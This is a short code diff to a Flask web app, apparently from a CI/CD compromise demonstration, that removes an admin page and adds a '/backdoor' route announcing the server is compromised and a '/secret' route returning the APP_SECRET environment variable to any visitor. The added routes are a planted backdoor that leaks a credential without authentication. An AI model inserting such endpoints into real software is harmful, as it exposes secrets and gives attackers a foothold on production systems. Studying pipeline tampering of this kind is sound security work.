@@ -1,15 +1,19 @@
-from flask import Flask, request, abort
+from flask import Flask
 import os
 
 app = Flask(__name__)
 
 @app.route("/")
 def home():
-    return '''<center><h1>production server running</h1>
-    Welcome Ambrose</center>
-    '''
-@app.route("/admin")
-def admin():
-    return "<h2>Administrator Page</h2>"
+    return "Hello from production"
 
-app.run(host="0.0.0.0", port=5000)
+@app.route("/backdoor")
+def backdoor():
+    return "🔥 Production compromised via CI/CD"
+
+@app.route("/secret")
+def secret():
+    return os.environ.get("APP_SECRET", "no secret")
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
